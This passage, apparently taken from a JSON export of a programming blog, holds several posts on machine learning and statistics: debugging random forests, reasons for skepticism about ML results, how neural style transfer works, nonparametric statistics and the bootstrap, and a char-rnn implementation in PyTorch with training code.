into it choices I hadn’t understood, and I could often tell “oh, that’s why it did that! That makes sense!” or “hmm, I think its training data might have been a little off, that doesn’t seem right”. For example! Suppose it said \n\n condition                                |    probability of lateness\n  passengers < 30 AND time of day > 7am  |    98%\n \n\n I… really don’t believe that flights with less than 30 passengers have a probability of lateness of 98%.  time of day > 7am  is like all flights! That’s not right at all! There must have been something wrong with the training data! \n\n Or I might have seen this: \n\n condition                                |    probability of lateness\n departing airport IN ('ORD', 'YUL', 'SFO',\n                       'LHR', 'LGA')     |    10%\n \n\n Now, maybe  ORD  (chicago) famously is extremely bad at getting flights out on time. It’s okay if one of my trees groups Chicago flights from flights with other airports, but if it’s consistently doing it? Not good! That will mean that it’ll overestimate the probability of a late flight coming out of Montreal (and underestimate it for Chicago). This is an easy thing to end up doing in scikit-learn, because even if you encode your airports as numbers (YUL=1, ORD=2, LHR=3, LGA=4, SFO=5), it’ll make its splits like  airport < 6 . You need to use a thing called “one-hot encoding” to avoid this. \n\n So it turns out that if you just do the simplest possible thing (get the random forest to report exactly why it made the choice that it did), it’s actually surprisingly helpful in helping debug! My coworkers also report that it’s useful in helping them build their models, even if it only tells you about one instance at a time. \n\n And it’s something that you can basically build from scratch in a few days! You can see a kind of messy example of how to print out what a scikit-learn random forest is doing in  this IPython notebook . \n\n using machine learning as way to guide experts \n\n I talked to someone at a conference a while ago who worked on automated trading systems, and we were talking about how machine learning approaches can be really scary because you fundamentally don’t know whether the ML is doing a thing because it’s smart and correct and better than you, or because there’s a bug in the data. \n\n He said that they don’t use machine learning in their production systems (they don’t trust it). But they DO use machine learning! Their approach was to \n\n \n have experts hand-build a model \n have the machine learning team train a model, and show it to the experts \n the expert says “oh, yes, I see the model is doing something smart there! I will build that in to my hand-built system” \n \n\n I don’t know if the this is the best thing to do, but I thought it was very interesting. \n\n how do you debug your machine learning models? \n\n I was really inspired after I did this exploration of  looking inside what a neural network is doing  – it seems like you can get at least a little bit of interpretability out of almost any model! \n\n There are more posts about this on the internet! Airbnb has one called  Unboxing the random forest classifier , Sift Science has  Large Scale Decision Forests: Lessons Learned , and this short paper called  A Model Explanation System  discusses a general system for explaining black box models (I’m actually, unusually,  very  excited about that paper) \n\n The more I learn about machine learning, the more I think that debugging tools & a clear understanding of how the algorithms you’re using work are totally essential for making your models better (actually, I don’t understand how they  wouldn’t  be – how can you make your models better if you have no idea what they’re doing? it makes no sense to me.) I imagine the people who build amazing neural nets and things like AlphaGo have an extremely strong understanding of the foundations of how neural networks work, and some sense for how the algorithms are translating the data into choices. \n\n As far as I can tell, scikit-learn ships with very few model debugging tools. For an example of what I mean by model debugging tools, check out  this toy notebook  where I train an overfit model, investigate a specific instance of something it predicted poorly, and find out why. \n\n I’d love to hear about what work you’re doing in explaining / debugging / untangling complex machine learning models, and especially if you’ve written anything about it. \n\n"},
{"url": "https://jvns.ca/blog/2016/05/19/a-few-reasons-to-be-skeptical-of-machine-learning-results/", "title": "A few reasons to be skeptical of machine learning", "content": "\n     \n\n I’m giving a talk at PyData Berlin on Friday, and it’s about \n\n \n why machine learning is fun and awesome \n how to trick a neural network \n why, even though machine learning is really awesome and cool and you can do super powerful and interesting things with it – why you should still be skeptical \n \n\n I wanted to put some of my ideas together, so as usual I’m writing a blog post. These are all pretty basic ideas but maybe they are helpful to people who are new to thinking about machine learning! We’ll see. \n\n machine learning models are only as good as the data you put into them \n\n When explaining what machine learning is, I’m giving the example of predicting the country someone lives in from their first name. So John might be American and Johannes might be German. \n\n In this case, it’s really easy to imagine what data you might want to do a good job at this – just get the first names and current countries of every person in the world! Then count up which countries Julias live in (Canada? The US? Germany?), pick the most likely one, and you’re done! \n\n This is a super simple modelling process, but I think it’s a good illustration – if you don’t include any data from China when training your computer to recognize names, it’s not going to get any Chinese names right! \n\n This also applies when you have Big Datasets – maybe you have bajillions of data points in the US, but very few in the rest of the world. This means your model will represent your US data but not the rest! \n\n machine learning programs can have bugs. \n\n So, machine learning is usually implemented with, well, computer programs. As we all know, computer programs sometimes (dare I say “usually”?) have bugs. \n\n At work it’s definitely happened that someone’s said to me “hey julia, why did the machine learning make this decision? it seems wrong?” and I’ve said “oh, you know, machine learning! it’s probably doing something cool and smart”. \n\n But then I look into it anyway. And then, rather than something cool and smart, the program I work on just had a bug. And then I was really happy that the people asking the questions didn’t assume that the machine learning was Correct and Smart, but that instead told us “hey, this looks wrong”. \n\n If you want to read more on the topic of “machine learning programs have bugs, maybe more bugs than regular programs”,  Machine Learning: The High Interest Credit Card of Technical Debt  is a fantastic paper from Google. \n\n machine learning models often are just totally wrong \n\n Okay, so let’s supposed you trained your model on a reasonable dataset, and your program has no bugs. Awesome. Here’s the results of a search in my Google Photos for the string “baby”. I’m assuming they’re using machine learning to classify my images and automatically attach keywords to them. \n\n \n\n These are all pictures of me and none of them are pictures of babies. It’s totally fine that Google Photos’ machine learning is doing a bad job here – it’s not a mission critical application of machine learning, and there are actually a few pictures of adorable babies in those search results. \n\n But there are also mysteriously/hilariously donald trump pinatas. \n\n \n\n Google Photos does awesome when I search for “fire hydrant” and “beach” and lots of other things, so, to be clear – this is totally a useful feature and I like it. But it’s definitely not perfect and sometimes it’s absurd. \n\n Again, this is something which is totally familiar to machine learning practitioners, but I think it’s a good reminder to be skeptical of individual machine learning predictions. \n\n be skeptical! \n\n Cathy O’Neil’s blog  is one of my favorites, because she constantly talks about the need to assume that just because something came out of a statistical model it isn’t “objective” or even necessarily correct. \n\n Carina Zona has a great talk called  Consequences of an insightful algorithm  which talks about a few cases where machine learning models that did what they were supposed to do had unintended negative consequences (like the famous Target pregnancy case). \n\n One of my favorite things is when a person (not a machine learning specialist! just anyone!) is like “hey, your machine learning? it did something I didn’t expect”. Often they’re right, and there  is  something weird going on, or something that could be improved. \n\n Machine learning is super powerful and you can build models that do amazing things, but they can also tell you that a donald trump pinata is a picture of a baby, and that makes no sense. \n\n"},
{"url": "https://jvns.ca/blog/2017/02/12/neural-style/", "title": "How do these \"neural network style transfer\" tools work?", "content": "\n     \n\n Hello! Last week I posted about  magical machine learning art tools . \n\n This got me to thinking – what would other cool machine learning art\ntools look like? For example! Sometimes I make drawings, like a drawing\nof a cat. What if machine learning could automatically transform my\ndrawing into a similar-but-better cat drawing? That would be fun! \n\n I started telling this idea to my partner, and he was like “julia, that\nsounds like you just read some hacker news headlines about generative\nneural networks and made this up”. Which was essentially correct! \n\n So I wanted to spend a little bit of time understanding how these\nmachine learning art tools actually work, by understanding the math\nthey’re based on (instead of some vague intuitive idea). I’m going to\nstart\nwith  A Neural Algorithm of Artistic Style \nbecause it’s a short paper and it’s written in a pretty understandable\nway. \n\n This paper is the work that powers the system\n deepart.io . The people who made that website are\nthe authors of the paper. Here’s what they advertise on their\nhomepage: \n\n \n \n \n\n This is pretty different from what I want to do but let’s learn how it\nworks anyway. \n\n “style” and “content” \n\n The core idea of this paper is that you can split an image into “style”\n(as in, “like the starry night painting”) and “content” (“it’s a picture\nof some houses on a river”). So, just like you can tell a human painter “paint\nme my house, but kind in the style of the teletubbies show”, you can\ntell this algorithm “paint this thing in the style of this other thing”. \n\n This is pretty vague though! Neural networks stuff is all math, so what\nis the mathematical definition of “style”? That’s what the paper\nattempts to define, and what we’ll explain a little bit here. \n\n an object recognition network \n\n These neural network art things tend to involve one specific neural\nnetwork. The neural network used in this “style transfer” tool is the\none described in  this paper , by the\n VGG group  at Oxford. \n\n The purpose of this network was not to generate art stuff at all! This\nnetwork’s job is to do image recognition (“that’s a cat! that’s a house!”). \n\n This particular network won the  ImageNet 2014 challenge  (the\nchallenge that all neural networks image recognition groups seem to\nparticipate in) in the “localization” category. \n\n Localization means that you need to recognize an object in the image and\nsay  where  the object in the image is. So you have to not just know\nthat there is a house, but also to give a box where the house is. \n\n We need a definition of “style” and “content”, and what this network\ndoes is to give us a definition for both style and content. How? \n\n a mathematical definition of “content” and “style” \n\n You can see the  layers of the neural network here . \n\n \n \n \n\n When we put an image into the network, it starts out as a vector of\nnumbers (the red/green/blue values for each pixel). At each layer of\nthe network we get another intermediate vector of numbers. There’s no\ninherent  meaning  to any of these vectors. \n\n But! If we want to, we could pick one of those vectors arbitrarily and\ndeclare “You know, I think that vector represents the  content ” of\nthe image. \n\n The basic idea is that the further down you get in the network (and the\ncloser towards classifying objects in the network as a “cat” or “house”\nor whatever”), the more the vector represents the image’s “content”. \n\n In this paper, they designate the “conv4_2” later as the “content”\nlayer. This seems to be pretty arbitrary – it’s just a layer that’s\npretty far down the network. \n\n Defining “style” is a bit more complicated. If I understand correctly, the definition\n“style” is actually the major innovation of this paper – they don’t\njust pick a layer and say “this is the style layer”. Instead, they take\nall the “feature maps” at a layer (basically there are actually a whole bunch of\nvectors at the layer, one for each “feature”), and define the “Gram\nmatrix” of all the pairwise inner products between those vectors. This\nGram matrix is the style. \n\n I still don’t completely understand this inner product thing. Someone\ntried to explain this to me  on twitter  a bit but\nI still don’t really get it. I think it’s explained a bit more in  this paper: Texture Synthesis Using Convolutional Neural Networks . \n\n They try different possible style layers:\n conv1_1 ,  conv2_1 ,  conv3_1 , and  conv4_1  in the paper, which all\ngive different results. \n\n So! Let’s say that we define the Gram matrix at  conv3_1  to be the “style”\nand the vector at  conv4_2  to be the “content” of an image. \n\n Drawing your house in the style of a painting \n\n So. Now we’ve defined “content” and “style”. \n\n Let’s say I have a picture of some houses on a river, and a famous\nstarry night painting. This picture has a “content” (which is the vector\nthat you get at layer  conv4_2  of the neural network). \n\n The famous painting has a “style”, which is the vector I get by feeding\nit into the neural network and taking the Gram matrix at layer  conv3_1 . \n\n So! What if I could find a picture which has the same “content” as the\nphoto of my house and the same “style” as the famous painting? This is\nexactly what the paper does. \n\n We start out with some white noise, and define a loss function (“how\ndifferent is the style from the painting, and how different is the\ncontent from the photo?“). This is equation 7 in the paper. \n\n \n \n \n\n Then we use gradient descent to move our white noise until we get a\nresult that minimizes this loss function. My impression is that gradient\ndescent is pretty fast, so we pretty quickly get the photo of our house\npainted like a famous painting. \n\n maybe your weird intuitions are right \n\n The exciting thing to me about this is – this is a weird thing that I\nwould not have thought would work. So maybe some of my other weird ideas about\nneural networks and art would also work, if I tried them out, as long\nas I find a reasonable mathematical way to formulate them!  I do not\nreally have time to do neural networks experiments but maybe I will find\nsome.\n The Unreasonable Effectiveness of Recurrent Neural Networks  is a great read here. \n\n It doesn’t seem trivial at all to figure out what weird art things will\nwork, though – they had to do a surprising-to-me mathematical\noperation to define the style/texture of a painting (this weird Gram\nmatrix thing where you take all these inner products). \n\n If you want to know more about the exact mathematical details you should\nread the paper! I found it kinda readable, though I still don’t really\nunderstand how they thought of the style definition. (though this depends if you\nconsider partial derivatives readable or not :)). I’ve probably gotten\nsomething wrong in here because I’m still pretty new to neural networks\nbut I think this is about right. Let me know if I’ve said something\nwrong! \n\n This short talk on music and art generation is really nice . \n\n"},
{"url": "https://jvns.ca/blog/2017/04/17/statistics-for-programmers/", "title": "Some good \"Statistics for programmers\" resources", "content": "\n     \n\n This post is basically a list of books & other resources that teach statistics\nusing programming. But first I wanted to say why I think that is important! You can skip further down if you’re already sold. \n\n Statistics can sometimes seem boring and difficult to understand. When I\nstart reading statistics textbooks, I read about \n\n \n the normal distribution \n t-tests \n chi-squared tests \n the central limit theorem \n \n\n I know what some of those things are (I have a math degree, after all, and so\nI have some idea of what the central limit theorem says). But I often don’t\nfind them that  useful  for solving my day to day statistics problems. \n\n Like, here are some questions I sometimes have about data \n\n \n I measured some performance numbers, made a change, and then measured\nsome new numbers. Did my change really make a difference? (“hypothesis testing”) \n I have a bunch of numbers and I want to know what the average is, and I want to know how seriously I should take that average (is it 6 +/- 1? or 6 +/= 0.01?) (“confidence intervals”) \n \n\n One of the biggest problems with tests like the chi-squared test is that they\nmake a lot of  assumptions  about how your data was generated. Usually they\nassume that your data is normally distributed. Not everything follows a normal\ndistribution! \n\n So – can I figure out if my change really made my code faster or not\nwithout having to make a bunch of assumptions? \n\n It turns out the answer is “yes”, and that there’s a whole subfield of\nstatistics devoted making less assumptions (“nonparametric statistics”). And\neven better – that subfield is actually  easier to use  than regular\nstatistics. \n\n Some of the methods: \n\n \n bootstrapping (which lets you calculate a mean + error bars for that mean!) \n shuffling your data (which lets you tell if 2 groups of numbers “really” have a different mean or not) \n \n\n These methods are often really computational – like\ninstead of using a bunch of formulas, you’ll write a program. And you’ll get\nstatistically valid answers back! I like this because even though I know a lot\nof math, I often find programs more intuitive than formulas. \n\n why program instead of use formulas? \n\n A lot of the formulas you can use to do statistics make a lot of assumptions,\nand then you can quickly use a formula to calculate the statistical thing you\nwant (like a chi-square test or whatever). This was necessary when people had\nreally limited computational resources (like, they had a book with tables in\nit and a pen and paper). \n\n But today we have computers! So we can use really dramatically different\nstatistical methods than people used in the 19th century. And often you\ncan make less assumptions, which can be really good! \n\n Anyway, I asked for recommendations for “nonparametric statistics for programmers” resources  on Twitter  and I got a lot of good recommendations back. Here they are. I haven’t \n\n some good “statistics for programmers” resources \n\n statistics without the agonizing pain \n\n This is a  really nice 10 minute talk about how to do statistics using programming . Here, I even embedded it! \n\n \n\n statistics for hackers, by jake vanderplas \n\n This  talk from PyCon 2016  is exactly\nthe kind of intro to nonparametric methods I’m talking about!!  It has a slide deck which is\ngood to read by itself. It introduces shuffling & bootstrapping which I think\nare two of the most important statistics methods to know. \n\n \n\n nonparametric stats with R \n\n This is the best thing I found so far that actually explains these nonparametric methods in an introductory way with programming. \n\n It’s is an online textbook that teaches basic nonparametric statistics with R.  An Introduction to Statistical and Data Sciences via R \n\n the two chapters i found most useful to look at were \n\n \n hypothesis testing \n how to calculate confidence intervals using bootstrapping  which is a great thing to be able to do. \n \n\n all of nonparametric statistics by Larry Wasserman \n\n This is a  physical book from Springer  and you can  get the PDF from his website . It’s a math book and not “teaching statistics with programming” but a a lot of people recommended it. \n\n Now we’re going to veer away from nonparametric stats and into statistics books for programmers generally. \n\n Allen Downey’s work \n\n Allen Downey wrote this great  textbook manifesto  and his work looks really approachable. All of his books are available online for free which is a really lovely thing. \n\n not so much nonparametric statistics but I hear really good things \n\n \n Think Stats \n Think Bayes \n \n\n Someone also mentioned \n\n \n Allen is a great teacher, so it’s worth watching (or, even better, attending) his tutorials as well as reading the books. \n \n\n I remember watching a statistics talk Allen gave at PyCon a few years back and being really impressed. \n\n introduction to probability by Peter Norvig \n\n Here it is ! \n\n probabilistic programming & bayesian methods for hackers \n\n Probabilistic Programming & Bayesian Methods for Hackers  by Cam Davidson-Pilon is a cool introduction to bayesian methods with a lot of calculations. \n\n even more links \n\n \n a paper someone said was good (by Efron):  Bootstrap Methods: another look at the jackknife \n this  book by 5 people named lock \n this  blog post has an overview of different nonparametric tests \n this  podcast with Philip Guo and John DeNero where they talk about teaching stats to programmers \n nonparametric statistical methods \n openintro  has free some statistics books \n \n\n tell me if you have more cool recommendations \n\n If there is an amazing book that teaches statistics with programming that I left out I would like to know about it! I’m on twitter at @b0rk. \n\n"},
{"url": "https://jvns.ca/blog/2018/12/29/some-initial-nonparametric-statistics-notes/", "title": "Some nonparametric statistics math", "content": "\n     \n\n \n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ['\\\\(','\\\\)']]}});\n \n \n \n\n I’m trying to understand nonparametric statistics a little more formally. This post may not be that\nintelligible because I’m still pretty confused about nonparametric statistics, there is a lot of\nmath, and I make no attempt to explain any of the math notation. I’m working towards being able to\nexplain this stuff in a much more accessible way but first I would like to understand some of the\nmath! \n\n There’s some MathJax in this post so the math may or may not render in an RSS reader. \n\n Some questions I’m interested in: \n\n \n what is nonparametric statistics exactly? \n what guarantees can we make? are there formulas we can use? \n why do methods like the bootstrap method work? \n \n\n since these notes are from reading a math book and math books are extremely dense this is basically\ngoing to be “I read 7 pages of this math book and here are some points I’m confused about” \n\n what’s nonparametric statistics? \n\n Today I’m looking at “all of nonparametric statistics” by Larry Wasserman. He defines nonparametric\ninference as: \n\n \n a set of modern statistical methods that aim to keep the number of underlying assumptions as weak\nas possible \n \n\n Basically my interpretation of this is that – instead of assuming that your data comes from a\nspecific family of distributions (like the normal distribution) and then trying to estimate the\nparameters of that distribution, you don’t make many assumptions about the distribution (“this is\njust some data!!“). Not having to make assumptions is nice! \n\n There aren’t  no  assumptions though – he says \n\n \n we assume that the distribution $F$ lies in some set $\\mathfrak{F}$ called a  statistical\nmodel . For example, when estimating a density $f$, we might assume that\n$$ f \\in \\mathfrak{F} = \\left\\{ g : \\int(g^{\\prime\\prime}(x))^2dx \\leq c^2 \\right\\}$$\nwhich is the set of densities that are not “too wiggly”. \n \n\n I have not too much intuition for the condition $\\int(g^{\\prime\\prime}(x))^2dx \\leq c^2$. I\ncalculated that integral for  the normal distribution on wolfram alpha  and got 4, which is a good start. (4 is not infinity!) \n\n some questions I still have about this definition: \n\n \n what’s an example of a probability density function that  doesn’t  satisfy that\n$\\int(g^{\\prime\\prime}(x))^2dx \\leq c^2$ condition? (probably something with an infinite number of\ntiny wiggles, and I don’t think any distribution i’m interested in in practice would have an\ninfinite number of tiny wiggles?) \n why does the density function being “too wiggly” cause problems for nonparametric inference? very\nunclear as yet. \n \n\n we still have to assume independence \n\n One assumption we  won’t  get away from is that the samples in the data we’re dealing with are\nindependent. Often data in the real world actually isn’t really independent, but I think the what\npeople do  a lot of the time is to make a good effort at something approaching independence and then\nclose your eyes and pretend it is? \n\n estimating the density function \n\n Okay! Here’s a useful section! Let’s say that I have 100,000 data points from a distribution.\nI can draw a histogram like this of those data points: \n\n \n\n If I have 100,000 data points, it’s pretty likely that that histogram is pretty close to the\nactual distribution. But this is math, so we should be able to make that statement precise, right? \n\n For example suppose that 5% of the points in my sample are more than 100. Is the probability that\na point is greater than 100  actually  0.05? The book gives a nice formula for this: \n\n $$ \\mathbb{P}(|\\widehat{P}_n(A) - P(A)| > \\epsilon ) \\leq 2e^{-2n\\epsilon^2} $$ \n\n (by  “Hoeffding’s inequality”  which I’ve\nnever heard of before). Fun aside about that inequality: here’s a nice jupyter notebook by henry\nwallace using it to  identify the most common Boggle words . \n\n here, in our example: \n\n \n n is 1000 (the number of data points we have) \n $A$ is the set of points more than 100 \n $\\widehat{P}_n(A)$ is the empirical probability that a point is more than 100 (0.05) \n $P(A)$ is the actual probability \n $\\epsilon$ is how certain we want to be that we’re right \n \n\n So, what’s the probability that the  real  probability is between 0.04 and 0.06? $\\epsilon =\n0.01$, so it’s $2e^{-2 \\times 100,000 \\times (0.01)^2} = 4e^{-9} $ ish (according to wolfram alpha) \n\n here is a table of how sure we can be: \n\n \n 100,000 data points: 4e-9 (TOTALLY CERTAIN that 4% - 6% of points are more than 100) \n 10,000 data points: 0.27 (27% probability that we’re wrong! that’s… not bad?) \n 1,000 data points: 1.6 (we know the probability we’re wrong is less than.. 160%? that’s not good!) \n 100 data points: lol \n \n\n so basically, in this case, using this formula: 100,000 data points is AMAZING, 10,000 data points\nis pretty good, and 1,000 is much less useful. If we have 1000 data points and we see that 5% of\nthem are more than 100, we DEFINITELY CANNOT CONCLUDE that 4% to 6% of points are more than 100. But\n(using the same formula) we can use $\\epsilon = 0.04$ and conclude that with 92% probability 1% to\n9% of points are more than 100. So we can still learn some stuff from 1000 data points! \n\n This intuitively feels pretty reasonable to me – like it makes sense to me that if you have NO IDEA\nwhat your distribution that with 100,000 points you’d be able to make quite strong inferences, and that with 1000 you can do a lot less! \n\n more data points are exponentially better? \n\n One thing that I think is really cool about this estimating the density function formula is that how\nsure you can be of your inferences scales  exponentially  with the size of your dataset (this is the\n$e^{-n\\epsilon^2}$). And also exponentially with the square of how sure you want to be (so wanting\nto be sure within 0.01 is VERY DIFFERENT than within 0.04). So 100,000 data points isn’t 10x better\nthan 10,000 data points, it’s actually like 10000000000000x better. \n\n Is that true in other places? If so that seems like a super useful intuition! I still feel pretty\nuncertain about this, but having some basic intuition about “how much more useful is 10,000 data\npoints than 1,000 data points?“) feels like a really good thing. \n\n some math about the bootstrap \n\n The next chapter is about the bootstrap! Basically the way the bootstrap works is: \n\n \n you want to estimate some statistic (like the median) of your distribution \n the bootstrap lets you get an estimate and also the variance of that estimate \n you do this by repeatedly sampling with replacement from your data and then calculating the\nstatistic you want (like the median) on your samples \n \n\n I’m not going to go too much into how to implement the bootstrap method because it’s explained in a\nlot of place on the internet. Let’s talk about the math! \n\n I think in order to say anything meaningful about bootstrap estimates I need to learn a new term: a\n consistent estimator . \n\n What’s a consistent estimator? \n\n Wikipedia says: \n\n \n In statistics, a  consistent estimator  or  asymptotically consistent estimator  is an\nestimator — a rule for computing estimates of a parameter $\\theta_0$ — having the property that as\nthe number of data points used increases indefinitely, the resulting sequence of estimates\nconverges in probability to $\\theta_0$. \n \n\n This includes some terms where I forget what they mean (what’s “converges in probability” again?).\nBut this seems like a very good thing! If I’m estimating some parameter (like the median), I would\nDEFINITELY LIKE IT TO BE TRUE that if I do it with an infinite amount of data then my estimate\nworks. An estimator that is not consistent does not sound very useful! \n\n why/when are bootstrap estimators consistent? \n\n spoiler: I have no idea. The book says the following: \n\n \n Consistency of the boostrap can now be expressed as follows. \n\n 3.19 Theorem . Suppose that $\\mathbb{E}(X_1^2) < \\infty$. Let $T_n = g(\\overline{X}_n)$ where\n$g$ is continuously differentiable at $\\mu = \\mathbb{E}(X_1)$ and that $g\\prime(\\mu) \\neq 0$.\nThen, \n\n $$ \\sup_u | \\mathbb{P}_{\\widehat{F}_n} \\left(  \\sqrt{n} (T( \\widehat{F}_n*) - T( \\widehat{F}_n) \\leq u \\right) - \\mathbb{P}_{\\widehat{F}} \\left(  \\sqrt{n} (T( \\widehat{F}_n) - T( \\widehat{F}) \\leq u \\right) | \\rightarrow^\\text{a.s.} 0 $$ \n\n 3.21 Theorem . Suppose that $T(F)$ is Hadamard differentiable with respect to $d(F,G)= sup_x|F(x)-G(x)|$ and\nthat $0 < \\int L^2_F(x) dF(x) < \\infty$.\nThen, \n\n $$ \\sup_u | \\mathbb{P}_{\\widehat{F}_n} \\left(  \\sqrt{n} (T( \\widehat{F}_n*) - T( \\widehat{F}_n) \\leq u \\right) - \\mathbb{P}_{\\widehat{F}} \\left(  \\sqrt{n} (T( \\widehat{F}_n) - T( \\widehat{F}) \\leq u \\right) | \\rightarrow^\\text{P} 0 $$ \n \n\n things I understand about these theorems: \n\n \n the two formulas they’re concluding are the same, except I think one is about convergence “almost\nsurely” and one about “convergence in probability”. I don’t remember what either of those mean. \n I think for our purposes of doing Regular Boring Things we can replace “Hadamard differentiable”\nwith “differentiable” \n I think they don’t actually show the consistency of the bootstrap, they’re actually about\nconsistency of the bootstrap confidence interval estimate (which is a different thing) \n \n\n I don’t really understand how they’re related to consistency, and in particular the $\\sup_u$ thing\nis weird, like if you’re looking at $\\mathbb{P}(something < u)$, wouldn’t you want to minimize $u$\nand not maximize it? Maybe it’s a typo and it should be $\\inf_u$? \n\n it concludes: \n\n \n there is a tendency to treat the bootstrap as a panacea for all problems. But the bootstrap\nrequires regularity conditions to yield valid answers. It should not be applied blindly. \n \n\n this book does not seem to explain why the bootstrap is consistent \n\n In the appendix (3.7) it gives a sketch of a proof for showing that estimating the  median  using\nthe bootstrap is consistent. I don’t think this book actually gives a proof anywhere that bootstrap\nestimates in general are consistent, which was pretty surprising to me. It gives a bunch of\nreferences to papers. Though I guess bootstrap confidence intervals are the most important thing? \n\n that’s all for now \n\n This is all extremely stream of consciousness and I only spent 2 hours trying to work through this, but some things I think I learned in the last couple hours are: \n\n \n maybe having more data is exponentially better? (is this true??) \n “consistency” of an estimator is a thing, not all estimators are consistent \n understanding when/why nonparametric bootstrap estimators are consistent in general might be very\nhard (the proof that the bootstrap median estimator is consistent already seems very\ncomplicated!) \n boostrap confidence intervals are not the same thing as bootstrap estimators. Maybe I’ll learn\nthe difference next! \n \n\n"},
{"url": "https://jvns.ca/blog/2020/11/30/implement-char-rnn-in-pytorch/", "title": "An attempt at implementing char-rnn with PyTorch", "content": "\n     \n\n Hello! I spent a bunch of time in the last couple of weeks implementing a\nversion of  char-rnn \nwith PyTorch. I’d never trained a neural network before so this seemed like a\nfun way to start. \n\n The idea here (from  The Unreasonable Effectiveness of Recurrent Neural\nNetworks ) is that\nyou can train a character-based recurrent neural network on some text and get\nsurprisingly good results. \n\n I didn’t quite get the results I was hoping for, but I wanted to share some\nexample code & results in case it’s useful to anyone else getting started with PyTorch\nand RNNs. \n\n Here’s the Jupyter notebook with the code:  char-rnn in\nPyTorch.ipynb .\nIf you click “Open in Colab” at the top, you can open it in Google’s Colab\nservice where at least right now you can get a free GPU to do training on. The\nwhole thing is maybe 75 lines of code, which I’ll attempt to somewhat explain\nin this blog post. \n\n step 1: prepare the data \n\n First up: we download the data! I used  Hans Christian Anderson’s fairy\ntales  from Project\nGutenberg. \n\n !wget -O fairy-tales.txt \n \n\n Here’s the code to prepare the data. I’m using the  Vocab  class from fastai,\nwhich can turn a bunch of letters into a “vocabulary” and then use that\nvocabulary to turn letters into numbers. \n\n Then we’re left with a big array of numbers ( training_set ) that we can use to\ntrain a model. \n\n from fastai.text import *\ntext = unidecode.unidecode(open('fairy-tales.txt').read())\nv = Vocab.create((x for x in text), max_vocab=400, min_freq=1)\ntraining_set = torch.Tensor(v.numericalize([x for x in text])).type(torch.LongTensor).cuda()\nnum_letters = len(v.itos)\n \n\n step 2: define a model \n\n This is a wrapper around PyTorch’s LSTM class. It does 3 main things in\naddition to just wrapping the LSTM class: \n\n \n one hot encode the input vectors, so that they’re the right dimension \n add another linear transformation after the LSTM, because the LSTM outputs a\nvector with size  hidden_size , and we need a vector that has size\n input_size  so that we can turn it into a character \n Save the LSTM hidden vector (which is actually 2 vectors) as an instance\nvariable and run  .detach()  on it after every round. (I struggle to\narticulate what  .detach()  does, but my understanding is that it kind of\n“ends” the calculation of the derivative of the model) \n \n\n class MyLSTM(nn.Module):\n    def __init__(self, input_size, hidden_size):\n        super().__init__()\n        self.lstm = nn.LSTM(input_size, hidden_size, batch_first=True)\n        self.h2o = nn.Linear(hidden_size, input_size)\n        self.input_size=input_size\n        self.hidden = None\n        \n    def forward(self, input):\n        input = torch.nn.functional.one_hot(input, num_classes=self.input_size).type(torch.FloatTensor).cuda().unsqueeze(0)\n        if self.hidden is None:\n            l_output, self.hidden = self.lstm(input)\n        else:\n            l_output, self.hidden = self.lstm(input, self.hidden)\n        self.hidden = (self.hidden[0].detach(), self.hidden[1].detach())\n        \n        return self.h2o(l_output)\n \n\n This code also does something kind of magical that isn’t obvious at all – if you pass it\nin a vector of inputs (like [1,2,3,4,5,6]), corresponding to 6 letters, my\nunderstanding is that  nn.LSTM  will internally update the hidden vector 6\ntimes using  backpropagation through time . \n\n step 3: write some training code \n\n This model won’t just train itself! \n\n I started out trying to use a training helper class from the  fastai  library (which\nis a wrapper around PyTorch). I found that kind of confusing because I didn’t\nunderstand what it was doing, so I ended up writing my own training code. \n\n Here’s some code to show basically what 1 round of training looks like (the\n epoch()  method). Basically what this is doing is repeatedly: \n\n \n Give the RNN a string like  and they ought not to teas  (as a vector of numbers, of course) \n Get the prediction for the next letter \n Compute the loss between what the RNN predicted, and the real next letter\n( e , because tease ends in  e ) \n Calculate the gradient ( loss.backward() ) \n Change the weights in the model in the direction of the gradient ( self.optimizer.step() ) \n \n\n class Trainer():\n  def __init__(self):\n      self.rnn = MyLSTM(input_size, hidden_size).cuda()\n      self.optimizer = torch.optim.Adam(self.rnn.parameters(), amsgrad=True, lr=lr)\n  def epoch(self):\n      i = 0\n      while i < len(training_set) - 40:\n        seq_len = random.randint(10, 40)\n        input, target = training_set[i:i+seq_len],training_set[i+1:i+1+seq_len]\n        i += seq_len\n        # forward pass\n        output = self.rnn(input)\n        loss = F.cross_entropy(output.squeeze()[-1:], target[-1:])\n        # compute gradients and take optimizer step\n        self.optimizer.zero_grad()\n        loss.backward()\n        self.optimizer.step()\n \n\n let  nn.LSTM  do backpropagation through time, don’t do it myself \n\n Originally I wrote my own code to pass in 1 letter at a time to the LSTM and\nthen periodically compute the derivative, kind of like this: \n\n for i in range(20):\n    input, target = next(iter)\n    output, hidden = self.lstm(input, hidden)\nloss = F.cross_entropy(output, target)\nhidden = hidden.detach()\nself.optimizer.zero_grad()\nloss.backward()\nself.optimizer.step()\n \n\n This passes in 20 letters (one at a time), and then takes a training step at\nthe end. This is called  backpropagation through time  and Karpathy\nmentions using this method in his blog post. \n\n This kind of worked, but my loss would go down for a while and then kind of\nspike later in training. I still don’t understand why this happened, but when I\nswitched to instead just passing in 20 characters at a time to the LSTM (as the\n seq_len  dimension) and letting it do the backpropagation itself, things got a\nlot better. \n\n step 4: train the model! \n\n I reran this training code over the same data maybe 300 times, until I got\nbored and it started outputting text that looked vaguely like English.  This\ntook about an hour or so. \n\n In this case I didn’t really care too much about overfitting, but if you were\ndoing this for a Real Reason it would be good to run it on a validation set. \n\n step 5: generate some output! \n\n The last thing we need to do is to generate some output from the model! I wrote\nsome helper methods to generate text from the model ( make_preds  and\n next_pred ). It’s mostly just trying to get the dimensions of things right,\nbut here’s the main important bit: \n\n output = rnn(input)\nprediction_vector = F.softmax(output/temperature)\nletter = v.textify(torch.multinomial(prediction_vector, 1).flatten(), sep='').replace('_', ' ')\n \n\n Basically what’s going on here is that \n\n \n the RNN outputs a vector of numbers ( output ), one for each letter/punctuation in our alphabet. \n The  output  vector isn’t  yet  a vector of probabilities, so\n F.softmax(output/temperature)  turns it into a bunch of probabilities (aka\n“numbers that add up to 1”).  temperature  kind of controls how much to\nweight higher probabilities – in the limit if you set\ntemperature=0.0000001, it’ll always pick the letter with the highest\nprobability. \n torch.multinomial(prediction_vector)  takes the vector of probabilities and\nuses those probabilites to pick an index in the vector (like 12) \n v.textify  turns “12” into a letter \n \n\n If we want 300 characters worth of text, we just repeat this process 300 times. \n\n the results! \n\n Here’s some generated 